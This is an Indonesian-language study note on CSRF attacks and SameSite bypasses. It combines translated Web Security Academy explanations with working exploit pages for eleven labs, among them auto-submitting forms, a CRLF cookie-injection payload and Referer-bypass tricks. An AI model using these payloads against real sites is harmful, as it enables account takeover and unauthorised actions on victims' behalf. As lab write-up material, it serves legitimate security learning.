	
## Apa dampak serangan CSRF?

Dalam serangan CSRF yang berhasil, penyerang menyebabkan pengguna korban melakukan suatu tindakan secara tidak sengaja. Misalnya saja untuk mengubah alamat email di akun mereka, mengubah kata sandi, atau melakukan transfer dana. Bergantung pada sifat tindakannya, penyerang mungkin bisa mendapatkan kendali penuh atas akun pengguna. Jika pengguna yang disusupi memiliki peran istimewa dalam aplikasi, maka penyerang mungkin dapat mengambil kendali penuh atas semua data dan fungsionalitas aplikasi.


**solve lab 1 :**

```html
<html>
    <body>
        <form id="autoSubmitForm" method="POST" action="https://0ac60036041c9017801a5856008500fe.web-security-academy.net/my-account/change-email">
        <input type="hidden" name="email" value="juh@normal-user.net"/>
    </form>
    
    <script>
        document.getElementById("autoSubmitForm").submit();
    </script>
    </body>
</html>
```



**Solve lab2:**

```json
GET /my-account/change-email?email=admin%40normal-user.net&csrf=CQQbYkMfwphjikTc2tzP8cqIoH5TnQ8Z HTTP/1.1
Host: 0aad0078047668a58591d1cf005c00b9.web-security-academy.net
Cookie: session=kFEbom06VJPPjxaKhWPGNwoL3SroWH6x
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0aad0078047668a58591d1cf005c00b9.web-security-academy.net/my-account?id=wiener
Origin: https://0aad0078047668a58591d1cf005c00b9.web-security-academy.net
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
Connection: close
```

```html
<html>
	<body>
		<form method="GET" action="https://0aad0078047668a58591d1cf005c00b9.web-security-academy.net/my-account/change-email?email=admin%40normal-user.net&csrf=CQQbYkMfwphjikTc2tzP8cqIoH5TnQ8Z">
			<input type="hidden" name="email" value="admin%40normal-user.net"/>
			<input type="hidden" name="csrf" value="CQQbYkMfwphjikTc2tzP8cqIoH5TnQ8Z"/>
			<input type="submit" value="Submit">
		</form>
	</body>
<html>
```


**Solve lab3:**
hanya menghapus token csrf nya saja, tinggal gmail lalu kirim dan boom 


**Solve lab4:**

di sini saya harus menggunakan 2 browser 1. untuk kirim email change yang ke 2. untuk generate token csrf. 


**Solve Lab5**

di sini saya mencoba search di web nya, ternyata itu di set ke header

```json
GET /?search=test
%0d%0aSet-Cookie: csrfKey=YOUR-KEY; SameSite=None HTTP/2
Host: 0a420046031b68398027219000e300f2.web-security-academy.net
Cookie: session=eZvg8J6PjbosudZk3bIpPfNBcluRsShC; LastSearchTerm=test; csrfKey=RFXazyF5vG5v89FmT5W97JATdDuYkD2y
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a420046031b68398027219000e300f2.web-security-academy.net/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers


```



response

```json
HTTP/2 200 OK
Set-Cookie: LastSearchTerm=test

Set-Cookie: csrfKey=YOUR-KEY; SameSite=None; Secure; HttpOnly
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 3466
```


```html
<html>
	<body>
		<form id="autoSubmitForm" method="POST" action="https://0a420046031b68398027219000e300f2.web-security-academy.net/my-account/change-email">
			<input type="hidden" name="email" value="woiwoiwoiahai@normal-user.net"/>
			<input type="hidden" name="csrf" value="DaUdbfsTUZHgn9ed4S52TwFPZ7Y2kG6S"/>
		</form>
<img src="https://0a420046031b68398027219000e300f2.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=RFXazyF5vG5v89FmT5W97JATdDuYkD2y%3b%20SameSite=None" onerror="document.forms[0].submit()">

	</body>
<html>
```


**Solve lab 6:**

karakteristik lab ini hampir sama seperti di lab 5, hanya saja csrf yang ada di set ke cookie itu sama. kayak di buat duplicate gitu, mari exploit.


```html
<html>
	<body>
		<form method="POST" action="https://0a3d009204a3c9c380ad81c300c90077.web-security-academy.net/my-account/change-email">
			<input type="hidden" name="email" value="acaaca@normal-user.net"/>
			<input type="hidden" name="csrf" value="NTNisW52LyQEfKjQ66jb9SUnSAnSSAbW"/>
<img src="https://0a3d009204a3c9c380ad81c300c90077.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=NTNisW52LyQEfKjQ66jb9SUnSAnSSAbW%3b%20SameSite=None" onerror="document.forms[0].submit();"/>
	</body>
		</form>
	</body>
<html>

```


## Melewati batasan cookie SameSite

SameSite adalah mekanisme keamanan browser yang menentukan kapan cookie suatu situs web disertakan dalam permintaan yang berasal dari situs web lain. Pembatasan cookie SameSite memberikan perlindungan parsial terhadap berbagai serangan lintas situs, termasuk CSRF, kebocoran lintas situs, dan beberapa eksploitasi CORS.

Sejak tahun 2021, Chrome berlaku `Lax` Pembatasan SameSite secara default jika situs web yang mengeluarkan cookie tidak secara eksplisit menetapkan tingkat pembatasannya sendiri. Ini adalah standar yang diusulkan, dan kami berharap browser besar lainnya akan mengadopsi perilaku ini di masa mendatang. Oleh karena itu, penting untuk memiliki pemahaman yang kuat tentang cara kerja pembatasan ini, serta bagaimana pembatasan tersebut berpotensi dilewati, untuk menguji vektor serangan lintas situs secara menyeluruh.

Di bagian ini, pertama-tama kita akan membahas cara kerja mekanisme SameSite dan memperjelas beberapa terminologi terkait. Kami kemudian akan melihat beberapa cara paling umum yang mungkin dapat Anda lakukan untuk melewati pembatasan ini, dengan mengaktifkan CSRF dan serangan lintas situs lainnya pada situs web yang awalnya tampak aman.


## Apa yang dimaksud dengan situs dalam konteks cookie SameSite?

Dalam konteks pembatasan cookie SameSite, sebuah situs didefinisikan sebagai domain tingkat atas (TLD), biasanya seperti ini `.com` atau `.net`, ditambah satu tingkat tambahan nama domain. Hal ini sering disebut sebagai TLD+1.

Saat menentukan apakah suatu permintaan merupakan situs yang sama atau tidak, skema URL juga dipertimbangkan. Ini berarti tautan dari `http://app.example.com` ke `https://app.example.com` diperlakukan sebagai lintas situs oleh sebagian besar browser.

|   |   |   |   |
|---|---|---|---|
|**Permintaan dari**|**Permintaan ke**|**Situs yang sama?**|**Asal yang sama?**|
|`https://example.com`|`https://example.com`|Ya|Ya|
|`https://app.example.com`|`https://intranet.example.com`|Ya|Tidak: nama domain tidak cocok|
|`https://example.com`|`https://example.com:8080`|Ya|Tidak: port tidak cocok|
|`https://example.com`|`https://example.co.uk`|Tidak: eTLD tidak cocok|Tidak: nama domain tidak cocok|
|`https://example.com`|`http://example.com`|Tidak: skema tidak cocok|Tidak: skema tidak cocok|

Ini merupakan perbedaan penting karena ini berarti kerentanan apa pun yang memungkinkan eksekusi JavaScript sewenang-wenang dapat disalahgunakan untuk melewati pertahanan berbasis situs di domain lain milik situs yang sama. Kita akan melihat contohnya di salah satu laboratorium nanti.

## Bagaimana cara kerja SameSite? - Lanjutan

Pengembang dapat secara manual mengonfigurasi tingkat pembatasan untuk setiap cookie yang mereka tetapkan, sehingga memberi mereka kontrol lebih besar terhadap kapan cookie ini digunakan. Untuk melakukan ini, mereka hanya perlu menyertakan `SameSite` atribut di `Set-Cookie` header respons, beserta nilai pilihannya:

`Set-Cookie: session=0F8tgdOhi9ynR1M9wa3ODa; SameSite=Strict`

Meskipun hal ini memberikan perlindungan terhadap serangan CSRF, tidak satupun dari pembatasan ini memberikan jaminan kekebalan, seperti yang akan kami tunjukkan dengan menggunakan laboratorium interaktif yang sengaja dibuat rentan di bagian ini.


# Strict

Jika cookie disetel dengan `SameSite=Strict` atribut, browser tidak akan mengirimkannya dalam permintaan lintas situs apa pun. Secara sederhana, ini berarti jika situs target permintaan tidak cocok dengan situs yang saat ini ditampilkan di bilah alamat browser, maka cookie tidak akan disertakan.

Hal ini direkomendasikan ketika mengatur cookie yang memungkinkan pembawa untuk mengubah data atau melakukan tindakan sensitif lainnya, seperti mengakses halaman tertentu yang hanya tersedia untuk pengguna yang diautentikasi.

Meskipun ini adalah opsi paling aman, ini dapat berdampak negatif pada pengalaman pengguna jika fungsionalitas lintas situs diinginkan.

# Lax

`Lax` Pembatasan SameSite berarti browser akan mengirimkan cookie dalam permintaan lintas situs, namun hanya jika kedua kondisi berikut terpenuhi:

- Permintaan tersebut menggunakan `GET` metode.
    
- Permintaan tersebut dihasilkan dari navigasi tingkat atas yang dilakukan pengguna, seperti mengeklik tautan.
    

Artinya cookie tersebut tidak disertakan dalam lintas situs `POST` permintaan, misalnya. Sebagai `POST` permintaan umumnya digunakan untuk melakukan tindakan yang mengubah data atau status (setidaknya menurut praktik terbaik), permintaan tersebut lebih mungkin menjadi target serangan CSRF.

Demikian pula, cookie tidak disertakan dalam permintaan latar belakang, seperti permintaan yang dimulai oleh skrip, iframe, atau referensi ke gambar dan sumber daya lainnya.



# None

Jika cookie disetel dengan `SameSite=None` atribut, ini secara efektif menonaktifkan pembatasan SameSite sama sekali, apa pun browsernya. Akibatnya, browser akan mengirimkan cookie ini di semua permintaan ke situs yang mengeluarkannya, bahkan permintaan yang dipicu oleh situs pihak ketiga yang sama sekali tidak terkait.

Kecuali Chrome, ini adalah perilaku default yang digunakan oleh browser utama jika tidak `SameSite` atribut disediakan saat mengatur cookie.

Ada alasan yang sah untuk menonaktifkan SameSite, seperti ketika cookie dimaksudkan untuk digunakan dari konteks pihak ketiga dan tidak memberikan akses kepada pembawa ke data atau fungsi sensitif apa pun. Cookie pelacakan adalah contoh tipikal.


## None - Lanjutan

Jika Anda menemukan kumpulan cookie dengan `SameSite=None` atau tanpa batasan eksplisit, ada baiknya diselidiki apakah ada gunanya. Saat perilaku "Lax-by-default" pertama kali diterapkan oleh Chrome, hal ini memiliki efek samping yaitu merusak banyak fungsi web yang ada. Sebagai solusi cepat, beberapa situs web memilih untuk menonaktifkan pembatasan SameSite pada semua cookie, termasuk cookie yang berpotensi sensitif.

Saat mengatur cookie dengan `SameSite=None`, situs web juga harus menyertakan `Secure` atribut, yang memastikan bahwa cookie hanya dikirim dalam pesan terenkripsi melalui HTTPS. Jika tidak, browser akan menolak cookie dan cookie tidak akan disetel.

`Set-Cookie: trackingId=0F8tgdOhi9ynR1M9wa3ODa; SameSite=None; Secure`


## Melewati batasan SameSite Lax menggunakan permintaan GET

Dalam praktiknya, server tidak selalu rewel mengenai apakah mereka menerima a `GET` atau `POST` permintaan ke titik akhir tertentu, bahkan mereka yang mengharapkan pengiriman formulir. Jika mereka juga menggunakan `Lax` pembatasan cookie sesi mereka, baik secara eksplisit atau karena default browser, Anda mungkin masih dapat melakukan serangan CSRF dengan menimbulkan `GET` permintaan dari browser korban.

Selama permintaan tersebut melibatkan navigasi tingkat atas, browser akan tetap menyertakan cookie sesi korban. Berikut ini adalah salah satu pendekatan paling sederhana untuk meluncurkan serangan tersebut:

`<script> document.location = 'https://vulnerable-website.com/account/transfer-payment?recipient=hacker&amount=1000000'; </script>`


## Melewati batasan SameSite Lax menggunakan permintaan GET - Lanjutan

Meski biasa saja `GET` permintaan tidak diperbolehkan, beberapa kerangka kerja menyediakan cara untuk mengganti metode yang ditentukan dalam baris permintaan. Misalnya, Symfony mendukung `_method` parameter dalam formulir, yang lebih diutamakan daripada metode normal untuk tujuan perutean:

```html
<form action="https://vulnerable-website.com/account/transfer-payment" method="POST"> 
<input type="hidden" name="_method" value="GET"> 
<input type="hidden" name="recipient" value="hacker"> 
<input type="hidden" name="amount" value="1000000"> 
</form>
```

Kerangka kerja lain mendukung berbagai parameter serupa.



**Lab solve 7**

```html

    <script>
        document.location = 'https://0ac9006a046c072d82e806cd00d6005c.web-security-academy.net/my-account/change-email?email=pwned1337@normal-user.net&_method=POST';
    </script>
```


**Lab solve 8**

```js
<script> document.location = "https://0a1d006904ad272c80b2174d00b500cb.web-security-academy.net/post/comment/confirmation?postId=1/../../my-account/change-email?email=pwned%40web-security-academy.net%26submit=1"; </script>
```



## Melewati batasan SameSite Lax dengan cookie yang baru diterbitkan


Untuk memicu penyegaran cookie tanpa korban harus masuk lagi secara manual, Anda perlu menggunakan navigasi tingkat atas, yang memastikan bahwa cookie yang terkait dengan sesi OAuth mereka saat ini disertakan. Hal ini menimbulkan tantangan tambahan karena Anda perlu mengarahkan pengguna kembali ke situs Anda sehingga Anda dapat meluncurkan serangan CSRF.

Alternatifnya, Anda dapat memicu penyegaran cookie dari tab baru sehingga browser tidak meninggalkan halaman sebelum Anda dapat melancarkan serangan terakhir. Kendala kecil dalam pendekatan ini adalah browser memblokir tab popup kecuali tab tersebut dibuka melalui interaksi manual. Misalnya, popup berikut akan diblokir oleh browser secara default:

`window.open('https://vulnerable-website.com/login/sso');`

Untuk menyiasatinya, Anda dapat membungkus pernyataan tersebut dalam sebuah `onclick` pengendali acara sebagai berikut:

`window.onclick = () => { window.open('https://vulnerable-website.com/login/sso'); }`

Dengan cara ini, itu `window.open()` metode ini hanya dipanggil ketika pengguna mengklik suatu tempat di halaman.


**Solve LAB 9**

```html
<html>
	<body>
window.onclick = () => { window.open('https://0aac00d6040d4f31808e301700ed0070.web-security-academy.net/my-account/change-email'); }
		<form method="POST" id="autoSubmitForm" action="https://0aac00d6040d4f31808e301700ed0070.web-security-academy.net/my-account/change-email">
			<input type="hidden" name="email" value="pwned@normal-user.net"/>
		</form>
	</body>
    <script>
        document.getElementById("autoSubmitForm").submit();
    </script>
<html>

```


## Validasi Referer bergantung pada header yang ada

Beberapa aplikasi memvalidasi `Referer` header ketika ada dalam permintaan tetapi lewati validasi jika header dihilangkan.

Dalam situasi ini, penyerang dapat merancang eksploitasi CSRF mereka sedemikian rupa sehingga menyebabkan browser pengguna korban menghapusnya `Referer` header dalam permintaan yang dihasilkan. Ada berbagai cara untuk mencapai hal ini, namun yang paling mudah adalah menggunakan tag META dalam halaman HTML yang menampung serangan CSRF:

`<meta name="referrer" content="never">`

**Solve LAB 10**

```html
<html>
<meta name="referrer" content="no-referrer">
	<body>
		<form method="POST" id="autoSubmitForm" action="https://0adb00a003a277f680d06c7800090047.web-security-academy.net/my-account/change-email">
			<input type="hidden" name="email" value="pwned@normal-user.net"/>
			<input type="submit" value="Submit">
		</form>
	</body>
   <script>
        document.getElementById("autoSubmitForm").submit();
    </script>
<html>
```



## Validasi Referer dapat dielakkan

Beberapa aplikasi memvalidasi `Referer` header dengan cara naif yang bisa dilewati. Misalnya, jika aplikasi memvalidasi domain di `Referer` dimulai dengan nilai yang diharapkan, maka penyerang dapat menempatkannya sebagai subdomain dari domainnya sendiri:

`http://vulnerable-website.com.attacker-website.com/csrf-attack`

Demikian pula, jika aplikasi hanya memvalidasi bahwa `Referer` berisi nama domainnya sendiri, maka penyerang dapat menempatkan nilai yang diperlukan di tempat lain di URL:

`http://attacker-website.com/csrf-attack?vulnerable-website.com`

#### Catatan

Meskipun Anda mungkin dapat mengidentifikasi perilaku ini menggunakan Burp, Anda akan sering menemukan bahwa pendekatan ini tidak lagi berfungsi saat Anda menguji bukti konsep Anda di browser. Dalam upaya mengurangi risiko kebocoran data sensitif dengan cara ini, banyak browser kini menghapus string kueri dari `Referer` tajuk secara default.

Anda dapat mengesampingkan perilaku ini dengan memastikan bahwa respons yang berisi eksploitasi Anda memiliki `Referrer-Policy: unsafe-url` set header (perhatikan itu `Referrer` dieja dengan benar dalam kasus ini, hanya untuk memastikan Anda memperhatikan!). Ini memastikan bahwa URL lengkap akan dikirim, termasuk string kueri.



**Solve LAB 11**

code:

```json
<html>
	<body>
<script>history.pushState('', '', '/?0ae9002b04d5ee60b9314955006b004f.web-security-academy.net')</script>

		<form id="autoSubmitForm" method="POST" action="https://0ae9002b04d5ee60b9314955006b004f.web-security-academy.net/my-account/change-email">
			<input type="hidden" name="email" value="pwned@normal-user.net"/>
			<input type="submit" value="Submit">
		</form>
  <script>
        document.getElementById("autoSubmitForm").submit();
    </script>
	</body>
<html>
```

header:

```json
Content-Type: text/html; charset=utf-8
Referrer-Policy: unsafe-url
```